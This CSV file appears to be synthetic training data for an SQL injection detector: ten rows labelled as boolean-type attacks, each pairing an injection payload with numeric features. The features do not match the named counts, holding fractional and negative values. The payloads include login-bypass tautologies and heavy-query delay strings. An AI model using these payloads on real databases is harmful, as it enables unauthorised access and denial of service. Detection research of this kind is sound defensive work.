id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R001780,4.420618365463695,169.52835083007812,63.272701263427734,11.574274063110352,42.762779235839844,0.08411218971014023,75.78446960449219,22.014026641845703,0.997358500957489,0.5009349584579468,0.1348387748003006,0.34028539061546326,0.11559462547302246,3.6431288719177246,3.0325136184692383,1.1432982683181763,-0.23861342668533325,-0.09258030354976654,-0.23264148831367493,-0.03545214235782623,3.815396547317505,2.7986927032470703,1.9927600622177124,0.004747163038700819,1.3879549503326416,0.017621198669075966,-0.013287038542330265,-0.02746039256453514,-0.8190405368804932,0.936743974685669,-0.024906817823648453,0.004275794606655836,0.11718034744262695,0.14280354976654053,0.05849456042051315,1.1645439863204956,3.721190929412842,2.135491371154785,0.17357295751571655,-0.004121802281588316,-0.11951211094856262,0.36673712730407715,0.8123413324356079,0.3352013826370239,-0.09091071784496307,-0.2365812361240387,-0.18797770142555237,0.07337577641010284,0.17776674032211304,0.34123989939689636,0.08740489929914474,0.0035806619562208652,0.01869872957468033,-0.13755713403224945,-0.7036241888999939,-0.06892518699169159,0.004047070629894733,0.5817949771881104,0.27164125442504883,0.24988505244255066,-0.0013073617592453957,0.012023106217384338,-0.0030943998135626316,1.124219536781311,-0.3721601068973541,0.11407441645860672,-0.11963129043579102,0.2390560358762741,0.173461452126503,0.29327696561813354,-0.12376558780670166,0.03701558709144592,-0.165401428937912,0.06570697575807571,-0.8247337937355042,-0.008681478910148144,1.4454197883605957,0.5378862023353577,-0.002131155226379633,0.17566648125648499,0.07324546575546265,4.998661994934082,0.9700798392295837,-0.17511898279190063,0.5183255672454834,-0.30023133754730225,0.07979811728000641,-0.3470015823841095,0.009879707358777523
GAN_000002,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.691749966152217,102.66667938232422,31.994892120361328,6.5683817863464355,39.14657974243164,-0.006157430354505777,30.608638763427734,8.637638092041016,0.9975636601448059,0.3426041901111603,0.22945629060268402,0.3649824261665344,0.13082872331142426,3.3955132961273193,2.988417625427246,1.7275147438049316,-0.41164785623550415,-0.11974076926708221,-0.025861727073788643,-0.03496469184756279,3.89677357673645,2.0599193572998047,1.6452239751815796,0.013229884207248688,1.1268366575241089,0.010618888773024082,-0.02579057775437832,-0.2664911448955536,-0.44633132219314575,0.32916387915611267,-0.0690501406788826,0.006034394260495901,0.12900133430957794,-0.40254688262939453,-0.1618366241455078,1.035904884338379,4.9555583000183105,1.7208573818206787,-0.20631790161132812,-0.011800570413470268,-0.17971277236938477,-0.06130087748169899,1.0447993278503418,0.09362652897834778,-0.05968553572893143,-0.39760568737983704,-0.05622725188732147,0.00587522191926837,0.24743501842021942,0.35587939620018005,-0.014302931725978851,0.016017327085137367,0.42426931858062744,0.08191415667533875,-0.88214510679245,-0.016430824995040894,-0.003628433682024479,0.11912529915571213,0.3579084277153015,0.35003775358200073,-0.0008904350106604397,-0.17679883539676666,-0.004795929417014122,-0.7688038349151611,-0.3974001109600067,0.10702047497034073,-0.1739567518234253,0.03705877065658569,0.3615506887435913,0.39461588859558105,-0.48152464628219604,0.23803630471229553,-0.1188570037484169,0.04194903373718262,-0.5678093433380127,-0.00752911577001214,1.2623077630996704,0.7202672958374023,0.0002194650296587497,0.3152051270008087,0.15229472517967224,3.671731472015381,1.0393860340118408,-0.07610267400741577,0.6813291907310486,-0.51861572265625,0.2213510125875473,-0.33830294013023376,-0.025209320709109306
GAN_000003,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R002659,5.781925919304254,172.83712768554688,50.34325408935547,21.198457717895508,50.20232391357422,0.07081116735935211,42.68270492553711,16.732566833496094,0.9977342486381531,0.3043811023235321,0.2058996856212616,0.42997491359710693,0.10452407598495483,2.9835119247436523,3.3547866344451904,2.4542863368988037,-0.07828754186630249,-0.19281800091266632,0.17021937668323517,-0.044807542115449905,4.143421649932861,3.082918405532837,1.2409480810165405,0.0321812704205513,1.3589434623718262,0.017062466591596603,0.00822770968079567,-0.2012314796447754,0.2786225974559784,0.49170106649398804,-0.075212761759758,0.006750837434083223,0.14693677425384521,-0.045326560735702515,-0.36368870735168457,1.448952078819275,4.263673782348633,2.356191635131836,-0.369232177734375,-0.022359412163496017,0.02059689536690712,-0.040389273315668106,0.7651929259300232,0.5972124338150024,0.20945999026298523,-0.18348270654678345,0.2084846943616867,0.3178817331790924,0.4525730609893799,0.42130962014198303,0.16504614055156708,0.07912322878837585,-0.31901639699935913,0.5185537934303284,-1.1723511219024658,0.2943916916847229,0.03959847241640091,0.5969836711883545,-0.17692720890045166,0.3716452717781067,0.000610861461609602,0.49074843525886536,-0.01832573302090168,0.09350597113370895,0.01642734184861183,0.1383906453847885,-0.08600746840238571,-0.002210840582847595,0.6288422346115112,0.054598793387413025,-0.27655017375946045,-0.4401652216911316,-0.4331517219543457,0.05522078275680542,-0.40295615792274475,-0.004984158556908369,1.4357985258102417,0.19383400678634644,0.002072326373308897,0.13953667879104614,-0.5037521123886108,2.711103916168213,0.9331831932067871,0.1821860373020172,0.10035687685012817,-0.321472704410553,0.014759501442313194,-0.9762129187583923,-0.00987999141216278
GAN_000004,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,6.301751554866528,298.55096435546875,73.7348861694336,36.555625915527344,102.9576416015625,0.025630470365285873,84.40724182128906,49.01633071899414,0.997813880443573,0.4027019143104553,0.15128344297409058,0.36870935559272766,0.10662412643432617,3.249904155731201,4.110740661621094,0.32524633407592773,0.18928515911102295,-0.18627426028251648,-0.2962595820426941,-0.015940604731440544,12.173301696777344,5.605123519897461,1.988523244857788,0.014745095744729042,1.799009084701538,0.022380253300070763,-0.024410424754023552,-0.3920516073703766,0.09784679114818573,1.159010887145996,-0.03406158462166786,0.0006049227085895836,0.3215979039669037,-0.08005319535732269,-0.0249615665525198,1.701645016670227,4.821170330047607,2.678666114807129,0.321338415145874,-0.005375820677727461,0.6799570918083191,0.2577815055847168,0.8396905064582825,0.2318245768547058,0.5536989569664001,0.08812317252159119,0.47332650423049927,0.4275558888912201,0.45900097489356995,0.6074728965759277,0.033970288932323456,0.2358444482088089,0.3741598129272461,0.07275888323783875,-0.9632596969604492,0.08556324988603592,0.05442216619849205,0.47934478521347046,0.36064794659614563,0.20187604427337646,-0.013005481101572514,0.225102961063385,-0.006451388821005821,3.8897926807403564,-0.6214212775230408,0.23190845549106598,-0.02026001736521721,0.1701422482728958,0.22884894907474518,0.009390361607074738,-0.27530139684677124,-0.110128253698349,0.02593347616493702,0.09318207204341888,-0.7051933407783508,-0.005898726172745228,1.6314780712127686,0.12738493084907532,-0.00635347468778491,-0.05979662388563156,0.23741215467453003,8.411334991455078,0.9635775089263916,-0.1353866308927536,0.685090184211731,-0.630742609500885,-0.15322069823741913,-0.4959565997123718,0.04605991765856743
GAN_000005,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,7.851959810529906,-37.92792510986328,57.32529067993164,-14.158034324645996,-24.57111358642578,-0.03844010457396507,37.32404708862305,-6.957172870635986,0.9957594871520996,0.6169112920761108,0.1119900643825531,0.27324727177619934,0.12687408924102783,4.057349681854248,2.8037796020507812,1.4988694190979004,0.5680288076400757,0.07051100581884384,-0.3620109260082245,-0.06154425069689751,-1.4813817739486694,-4.738249778747559,2.30702543258667,0.00029710831586271524,0.7528527975082397,0.040177203714847565,0.07332813739776611,-0.740586519241333,-2.0388574600219727,1.321279525756836,-0.08117418736219406,-0.0023561634588986635,-0.16565142571926117,0.6082331538200378,0.5771816968917847,0.4302978813648224,-0.14268527925014496,0.9383100271224976,-0.2769075632095337,-0.010838457383215427,-0.012794164009392262,0.6920387744903564,1.7316304445266724,0.12456466257572174,0.0808325856924057,-0.9934724569320679,-0.9232621788978577,-0.4757402837276459,-0.07667923718690872,0.47920432686805725,-0.1475343406200409,-0.3783959150314331,0.11307109892368317,-0.4363865256309509,-1.7493302822113037,-1.2194252014160156,0.018777839839458466,1.2382904291152954,0.47638261318206787,0.5428718328475952,0.008983977138996124,-0.3933301866054535,-0.005332659929990768,-1.1978585720062256,-0.9627436995506287,0.13309989869594574,-0.25017300248146057,0.8297951221466064,0.1897987276315689,0.8854237794876099,-0.48621147871017456,-0.3364754915237427,-0.16497331857681274,0.074405238032341,-0.9695035219192505,-0.01261739432811737,1.1211200952529907,0.46092846989631653,-0.007458668667823076,0.36489957571029663,-0.043500036001205444,0.5265533328056335,1.181276559829712,-0.449070543050766,0.47826269268989563,-0.9042224884033203,0.5775887966156006,-0.12181772291660309,0.016691964119672775
GAN_000006,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",nearest_attack_euclidean,R003655,5.026740404759425,139.17425537109375,64.3998031616211,11.181780815124512,33.358375549316406,0.056794263422489166,52.692352294921875,19.464200973510742,0.996776819229126,0.4842101037502289,0.11626627296209335,0.3354165256023407,0.11589038372039795,3.4932847023010254,3.0239384174346924,1.3636046648025513,0.5387556552886963,-0.09984280169010162,-0.244158536195755,-0.07333815842866898,4.707906723022461,1.17021906375885,1.807580828666687,0.015564128756523132,1.3070036172866821,0.025908714160323143,0.03933339938521385,-0.3973664939403534,-0.8648658990859985,1.1342930793762207,-0.05329902842640877,0.004308042116463184,0.0639897882938385,0.13730035722255707,0.26805683970451355,1.3133277893066406,2.3323991298675537,1.79727041721344,0.12354204058647156,-0.009457684122025967,0.2823772132396698,0.4343950152397156,1.016629695892334,0.3649941682815552,0.3708849549293518,-0.46781811118125916,-0.32928407192230225,-0.07426745444536209,0.2066575437784195,0.45509210228919983,-0.04134707897901535,-0.025175346061587334,0.12227530777454376,0.10497526824474335,-1.1429380178451538,-0.3688611388206482,0.03940165787935257,0.6898584961891174,0.33814653754234314,0.4213751554489136,0.005388894118368626,-0.12471874058246613,-0.0038055828772485256,0.5010412931442261,-0.24313275516033173,0.15896494686603546,-0.08058573305606842,0.340853750705719,0.11643499881029129,0.3578377366065979,-0.37535518407821655,-0.11921648681163788,-0.2074803113937378,0.050704412162303925,-0.5821264386177063,-0.008182203397154808,1.3976600170135498,0.49871930480003357,-0.0012368144234642386,0.05149909108877182,-0.09953957796096802,3.8035738468170166,1.043328046798706,-0.2831325829029083,0.5173908472061157,-0.4391961097717285,0.1927538961172104,-0.48991984128952026,0.02982024848461151
GAN_000007,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,5.194428169412036,269.5678405761719,58.07191848754883,28.74144744873047,95.51132202148438,0.09388171136379242,72.25269317626953,36.464176177978516,0.9989233016967773,0.391277015209198,0.20209719240665436,0.4068062901496887,0.1086759939789772,3.0922627449035645,3.157150983810425,0.9297371506690979,-0.6504942774772644,-0.1565074920654297,-0.1396164745092392,0.031337469816207886,7.533113479614258,5.6681060791015625,1.8885997533798218,0.011040903627872467,1.770580768585205,0.004665889777243137,-0.050745416432619095,-0.021307852119207382,-0.27163130044937134,0.5989678502082825,-0.03639901429414749,0.006583623122423887,0.1242184266448021,-0.2980688810348511,-0.2774832844734192,1.519798755645752,5.622136116027832,2.603558301925659,0.035864174365997314,-0.004441951401531696,0.052461687475442886,0.10393797606229782,0.40503162145614624,0.37900465726852417,0.46231603622436523,0.12246409058570862,0.47781533002853394,0.5506067872047424,0.33806470036506653,0.3431335687637329,0.14569342136383057,0.20295442640781403,0.10560806840658188,0.17193135619163513,-0.5275120139122009,0.2428322583436966,0.01424467097967863,0.4020135998725891,0.22610387206077576,0.12548573315143585,-0.01094023510813713,0.36079007387161255,-0.011769221164286137,2.713225841522217,-0.346964955329895,0.1918686181306839,-0.048751454800367355,0.27307558059692383,0.40433624386787415,-0.08700329810380936,-0.1566239297389984,-0.18979275226593018,-0.3795053958892822,0.07716327905654907,-0.5883388519287109,-0.00224404688924551,1.5740267038345337,0.2645755708217621,-0.0032787644304335117,4.300595264794538e-06,0.024650104343891144,7.21895694732666,0.9079439640045166,0.2996802031993866,0.22359387576580048,-0.49884599447250366,-0.40498340129852295,-0.6558559536933899,-0.027428779751062393
GAN_000008,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.382729389208284,342.1443786621094,82.49906921386719,33.339012145996094,112.3212890625,0.1258460432291031,90.31282806396484,50.42746353149414,1.0001753568649292,0.4328751862049103,0.18737000226974487,0.4419049322605133,0.0869767889380455,2.990684986114502,3.790393114089966,0.9132182598114014,-0.738985002040863,-0.18279053270816803,-0.16992329061031342,0.010315107181668282,11.05533218383789,5.172337532043457,2.3145854473114014,0.008050636388361454,1.8580610752105713,-0.002457643626257777,-0.05280192568898201,-0.19670596718788147,-1.147134780883789,0.6307554244995117,-0.0216522216796875,0.008860506117343903,0.14535823464393616,-0.4100760221481323,-0.23725402355194092,1.7326282262802124,5.238643169403076,3.3555147647857666,0.46294644474983215,0.0011378416093066335,0.0806422084569931,-0.007234339602291584,0.30767908692359924,0.45221346616744995,0.40315407514572144,0.18401484191417694,0.48420774936676025,0.729288637638092,0.3573834002017975,0.3917507827281952,0.06479393690824509,0.27590352296829224,-0.23641379177570343,0.192082941532135,-0.5018213391304016,0.22829920053482056,0.05043274164199829,0.4629136621952057,0.09751427918672562,0.2248166799545288,-0.014295565895736217,0.6382525563240051,-0.015821753069758415,3.7747976779937744,-0.13989953696727753,0.24975451827049255,-0.025250498205423355,0.24060119688510895,0.3942974805831909,-0.22810661792755127,0.2295452058315277,-0.2436959594488144,-0.34186628460884094,0.08869890123605728,-0.35724717378616333,-0.004353523254394531,1.7379547357559204,0.4204346239566803,-8.250812970800325e-05,-0.22249165177345276,0.014598533511161804,9.21705150604248,0.9073905348777771,0.5375012159347534,0.5419234037399292,-0.009919017553329468,-0.3753584325313568,-0.9088300466537476,-0.02022152580320835
GAN_000009,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,9.040110125032324,-145.0113525390625,21.04998779296875,-27.447641372680664,-56.591644287109375,-0.10358315706253052,-8.492863655090332,-26.38205909729004,0.9965614080429077,0.4300878047943115,0.23313400149345398,0.3220551908016205,0.13084597885608673,3.8211915493011475,3.3448524475097656,2.303302526473999,-0.10320359468460083,0.030608713626861572,-0.038200054317712784,-0.0584784559905529,-2.390761375427246,-7.144347190856934,2.1695196628570557,0.011348591186106205,0.1506420075893402,0.02879568748176098,0.048278581351041794,-0.8710188865661621,-1.829816222190857,0.34950780868530273,-0.1253560334444046,-0.0005684214411303401,-0.09817308187484741,0.10109476745128632,0.2525865435600281,0.14249064028263092,-0.2045198529958725,0.6852047443389893,-0.705920934677124,-0.01930265873670578,-0.40367457270622253,0.06549849361181259,2.095104217529297,-0.041542284190654755,-0.35089969635009766,-0.9777195453643799,-1.1901837587356567,-0.42249825596809387,0.019298195838928223,0.4053856134414673,-0.250619500875473,-0.4233958125114441,-0.011541403830051422,-0.41383248567581177,-1.913421630859375,-1.2090543508529663,-0.003958247601985931,0.7224420309066772,0.4044318199157715,0.6623579859733582,0.0074521820060908794,-0.46230223774909973,-0.006456025876104832,-3.7654151916503906,-0.8449145555496216,0.08237560093402863,-0.38782235980033875,0.5107492804527283,0.6389474868774414,0.8407421708106995,-0.4947463274002075,-0.033924128860235214,-0.1486111879348755,0.039977699518203735,-0.6574453115463257,-0.015725232660770416,0.8199553489685059,0.815688967704773,0.0009452098165638745,0.5621331334114075,-0.06243434548377991,-2.2502281665802,1.296952247619629,0.03152378648519516,0.6991321444511414,-0.655307948589325,0.914058268070221,-0.2913496494293213,-0.03936362639069557
GAN_000010,attack,boolean,1' and 7533  =  7533 and 'clqy' like 'clqy,nearest_attack_euclidean,R002193,8.00560459151133,-65.2411117553711,16.107147216796875,-12.513354301452637,-26.144546508789062,-0.018455995246767998,8.059161186218262,-22.332860946655273,0.996889591217041,0.4879271686077118,0.23043788969516754,0.33882561326026917,0.13506382703781128,3.537607192993164,2.9163432121276855,2.4457671642303467,-0.31553322076797485,0.13236406445503235,-0.13984957337379456,-0.027643175795674324,-3.970827102661133,-2.675386905670166,2.5102322101593018,0.003047337755560875,0.35170885920524597,0.02812182903289795,-0.009816535748541355,-0.4905869662761688,-1.5369235277175903,0.5911775231361389,-0.11403166502714157,0.008857605047523975,-0.16729725897312164,-0.04762087017297745,-0.055473871529102325,0.2679648697376251,3.392444610595703,0.9627755880355835,-0.8302278518676758,-0.013410508632659912,-0.7809937000274658,0.13831716775894165,1.652817964553833,0.17332231998443604,-0.34733080863952637,-0.8171330690383911,-0.8358588218688965,-0.3293618857860565,-0.033592842519283295,0.2653754949569702,-0.22509688138961792,-0.31643134355545044,0.32644012570381165,-0.25601693987846375,-1.5197664499282837,-0.5241546034812927,0.015530098229646683,1.1273698806762695,0.2926159203052521,-0.16133832931518555,0.005629498511552811,-0.3148064613342285,-0.01153695210814476,-1.633692741394043,-0.9851552844047546,0.03973942995071411,-0.327078253030777,0.7029199004173279,0.5592280626296997,1.1292202472686768,-0.6285717487335205,-0.10484775900840759,-0.5384587049484253,0.13008326292037964,-0.7804787755012512,-0.005104299634695053,1.1883678436279297,0.5814222097396851,-0.0016585419652983546,0.7103456854820251,-0.1821202039718628,0.11891528218984604,1.0576821565628052,-0.18403595685958862,0.4379841387271881,-1.2609421014785767,0.4857708513736725,-0.3159483075141907,-0.09802752733230591
